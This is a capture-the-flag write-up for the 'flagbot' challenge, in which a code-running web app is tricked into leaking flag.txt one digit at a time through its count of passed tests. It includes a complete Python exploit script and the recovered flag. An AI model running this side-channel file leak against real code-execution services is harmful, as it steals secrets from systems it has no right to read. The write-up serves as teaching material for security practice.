# flagbot

## Challenge

a webapp with a text editor where we can write python code

the code is executed by the remote server, which checks the function `f(a,b)`

if the function returns the sum of `a+b`, the test is successful

the remote server tests 10 cases and returns the number of successful tests, or reports an error in code

the flag is accessible by the python code, no external connections are allowed

## Solution

the server leaks a number between 0-11 on each run

we can convert the flag to a base10 or base11 value and leak individual digits

base11 is more efficient, but base10 is more common and easier to work with

in the case of base11, an EOF signal can be sent using the error reporting

in the case of base10, an EOF signal can be sent using the value 10, while 0-9 are reserved for digits

to use base10, we convert the flag to a hexadecimal string, then convert the value to a decimal number

we send the desired digit by passing a specific number of tests

once the stop signal is received, we can convert back to hexadecimal and then to ascii

## Exploit

```py
#!/usr/bin/python3

from requests import post
from binascii import unhexlify

url = 'https://yeetcode.be.ax/yeetyeet'

payload = """
from binascii import hexlify

f = open("flag.txt", "r")
flag = f.read()

d = int(hexlify(flag.encode()), 16) // (10 ** e)

if d == 0:
    d = 10
else:
    d %= 10

c = 0

def f(a,b):
    global c
    if(c < d):
        c+=1
        return a+b
    else:
        return 0
"""

e = 0
dec = 0

while True:
    x = post(url, data = "e={}\n".format(e) + payload)
    res = x.json()['p']
    if res != 10:
        dec += res * (10 ** e)
        e += 1
        if e % 10 == 0:
            print("Progress: {}".format(e))
    else:
        break

print(unhexlify(hex(dec)[2:]).decode())
```

## Flag

`corctf{1m4g1n3_cp_g0lf_6a318dfe}`

